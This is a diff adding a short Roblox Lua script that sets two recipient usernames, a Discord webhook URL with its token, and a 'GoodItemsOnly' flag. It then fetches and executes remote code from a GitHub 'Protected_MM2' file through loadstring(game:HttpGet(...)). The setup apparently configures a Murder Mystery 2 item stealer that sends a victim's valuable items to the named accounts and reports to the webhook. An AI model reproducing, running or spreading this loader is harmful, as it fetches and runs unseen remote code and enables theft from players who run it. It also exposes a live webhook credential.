@@ -1,0 +1,7 @@
+Username = "pablogarote"
+Username2 = "evo12342jjj"
+Webhook = "https://discordapp.com/api/webhooks/1370823807404609536/t2YYogMFbPzAj39AU4R-CSR5Md2WTzOw0fS6oWh-b-4KnyU4mp8yqa4r9jnsCy1fSurF"
+GoodItemsOnly = true
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/urekshesh/Protected_MM2/refs/heads/main/MM2"))()
